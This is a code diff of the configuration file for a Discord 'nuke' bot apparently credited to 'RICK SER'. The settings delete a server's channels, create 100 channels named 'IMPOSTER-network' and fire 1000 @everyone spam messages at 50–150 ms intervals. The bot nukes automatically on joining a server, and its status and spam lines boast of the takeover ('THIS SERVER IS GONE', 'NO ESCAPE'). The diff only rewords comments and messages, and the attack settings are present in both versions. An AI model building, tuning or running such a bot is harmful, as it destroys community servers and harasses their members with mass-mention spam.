@@ -1,4 +1,4 @@
-// config.js - ULTRA FAST NUKE CONFIG
+// config.js - ULTRA FAST SETTINGS
 require('dotenv').config();
 
 module.exports = {
@@ -6,45 +6,40 @@ module.exports = {
     token: process.env.DISCORD_TOKEN || 'YOUR_BOT_TOKEN_HERE',
     prefix: '!',
     
-    // ULTRA NUKE Settings
+    // MASSIVE NUKE SETTINGS
     channelName: 'IMPOSTER-network',
-    spamMessage: '@everyone NUKE BY RICK SER 💀🔥',
-    channelsToCreate: 100,           // 100 CHANNELS
-    messagesPerChannel: 10,           // 10 messages each = 1000 TOTAL
+    spamMessage: '@everyone **NUKE BY RICK SER** 💀 @everyone', // Includes @everyone
+    channelsToCreate: 100,        // 100 CHANNELS
+    messagesPerChannel: 10,        // 10 MESSAGES EACH = 1000 TOTAL MESSAGES
     
-    // FAST DELAY Settings (MINIMAL to maximize speed)
+    // ULTRA FAST DELAYS (MINIMAL to maximize speed)
     delays: {
-        delete: 100,      // SUPER FAST deletion (100ms)
-        create: 150,       // FAST creation (150ms)
-        spam: 50,          // ULTRA FAST spam (50ms)
-        embed: 100         // FAST embed
+        delete: 100,       // Super fast deletion (100ms)
+        create: 150,        // Fast creation (150ms)
+        spam: 50,           // Rapid fire spam (50ms)
+        embed: 100          // Fast embed sending
     },
     
     // Auto Nuke Settings
-    autoNukeOnJoin: true,
+    autoNukeOnJoin: true,  // Instant nuke on join
     
     // Server Settings
     port: process.env.PORT || 3000,
     
-    // Bot Status
+    // Bot Status Messages
     statusMessages: [
-        '💀 ULTRA NUKE READY',
+        '💀 MASS NUKE READY',
         '🔥 100 CHANNELS',
-        '⚡ 1000 MENTIONS',
-        '💀 @everyone SPAM'
+        '⚡ 1000 @everyone SPAM',
+        '💀 BY RICK SER'
     ],
     
     // SPAM MESSAGES WITH @EVERYONE
     spamMessages: [
-        '@everyone 💀 **NUKE BY RICK SER** 💀',
-        '@everyone 🔥 **IMPOSTER NETWORK TAKEOVER** 🔥',
-        '@everyone ⚡ **THIS SERVER IS GONE** ⚡',
-        '@everyone 💀 **100 CHANNELS CREATED** 💀',
-        '@everyone 🔥 **1000 MESSAGES SENT** 🔥',
-        '@everyone ⚡ **GET F** ⚡',
-        '@everyone 💀 **RICK SER OWNS THIS** 💀',
-        '@everyone 🔥 **IMPOSTER RULES** 🔥',
-        '@everyone ⚡ **CHANNELS DELETED** ⚡',
-        '@everyone 💀 **NO ESCAPE** 💀'
+        '@everyone 💀 **NUKE BY RICK SER** 💀 @everyone',
+        '@everyone 🔥 **IMPOSTER NETWORK TAKEOVER** 🔥 @everyone',
+        '@everyone ⚡ **100 CHANNELS DESTROYED** ⚡ @everyone',
+        '@everyone 💀 **THIS SERVER IS GONE** 💀 @everyone',
+        '@everyone 🔥 **@EVERYONE SPAM ACTIVE** 🔥 @everyone'
     ]
 };
